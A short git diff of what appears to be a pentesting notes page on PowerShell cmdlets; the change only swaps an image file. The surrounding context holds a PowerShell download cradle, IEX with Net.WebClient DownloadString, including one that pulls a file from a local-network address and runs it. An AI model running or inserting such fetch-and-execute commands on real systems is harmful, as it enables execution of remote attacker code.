@@ -21,7 +21,7 @@ A cmdlet is a lightweight command that is used in the PowerShell environment. Th
 
 
 
-![](<../../.gitbook/assets/image (191).png>)
+![](<../../.gitbook/assets/image (14).png>)
 
 * "IEX (New-Object Net.WebClient).DownloadString('URL')"
   * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')
